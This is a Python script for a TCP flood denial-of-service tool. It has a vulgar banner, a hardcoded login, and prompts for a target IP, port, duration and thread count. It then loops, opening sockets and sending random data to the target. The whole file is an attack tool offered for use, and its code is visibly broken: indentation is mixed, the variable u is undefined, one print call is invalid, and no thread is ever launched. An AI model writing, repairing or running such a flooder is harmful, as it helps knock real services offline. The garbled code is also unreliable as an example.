# -*- coding: utf-8 -*-
import logging
import random
import socket
import threading
import os
import sys
import time
import fade

#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
attemps = 0
os.system("clear")
print("")
print("\033[91m||_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_||\033[0m")
print("\033[91m||                                                                   ||\033[0m")
print("\033[91m||       ±± ±± ±±        ±± ±± ±±                     ±±±            ||\033[0m")     
print("\033[91m||       ±±       ±±     ±±       ±±                ±± ±±            ||\033[0m")       
print("\033[91m||       ±±       ±±     ±±       ±±                   ±±            ||\033[0m")
print("\033[91m||       ±±       ±±     ±±       ±±                   ±±            ||\033[0m")
print("\033[95m||       ±± ±± ±±        ±± ±± ±±        ________      ±±            ||\033[0m")
print("\033[95m||       ±±   ±±         ±±   ±±         ±± ±± ±±      ±±            ||\033[0m")
print("\033[95m||       ±±     ±±       ±±     ±±                     ±±            ||\033[0m")
print("\033[95m||       ±±       ±±     ±±       ±±                ±± ±± ±±         ||\033[0m")
print("\033[97m||                                                                   ||\033[0m")     
print("\033[95m||      Author  :  R1R1-DDOS                                         ||\033[0m")
print("\033[96m||      Github  :  https://github.com/RR-DDos                        ||\033[0m")
print("\033[94m||                 Fucking genocide                                  ||\033[0m")
print("\033[33m||_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_||\033[0m")         
while attemps < 100:
    username = input("\033[36mEnter your username: \033[0m")
    password = input("\033[93mEnter your password: \033[0m")

    if username == 'r2' and password == 'r2':
        print("\033[33m----------------------------------💥\033[0m")
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue
os.system("clear")

ip = str(input(" Target IP :"))
port = int(input(" Target Port :"))
choice = str(input(" (y/n) :"))
times = int(input(" Time :"))
threads = int(input(" Threads :"))

time.sleep(5),
print("\033[96m                  ⟩⟩  DD0S TCP LOADER \033[0m "),
time.sleep(5),
print("\033[92m                  ⟩⟩  search server \033[0m "),
time.sleep(5),
print("\033[1m                  ⟩⟩  starts connection \033[0m "),
time.sleep(5),
print("\033[97m                  ⟩⟩  penetrate security layer \033[0m "),
time.sleep(5),
print("\033[95m                  ⟩⟩  send Packet \033[0m "),
time.sleep(5),
def function():
	data = random._urandom(818)
	i = random.choice(("[✴️]","[#]"))
	while True:
		try:
			
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("\033[32m[✴️\033[32m]   Ririe  \033[94m" +str(u)+ "  \033[33mSent Packet  \033[91m" +ip+ "\033[0m" )
                        print("\033[33m————————————————————————————————————————————————————————🚀\033[0m")
                        print("\033[93m[✴️\033[93m]   Ririe  \033[92m" +str(u)+ "  \033[32mAttack Wabs  \033[95m" +ip+ "\033[0m" )
                        print("\033[94m————————————————————————————————————————————————————————🚀\033[0m")
                        print("\033[95m[✴️\033[95m]   Ririr  \033[96m" +str(u)+ "  \033[92mRequest Target  \033[32m" +ip+ "\033[0m" )
                        print("\033[31m————————————————————————————————————————————————————————🚀\033[0m")
			print( +"Attack Sent!!!")
		except:
			s.close()
			print("[*] Error!!!")
											
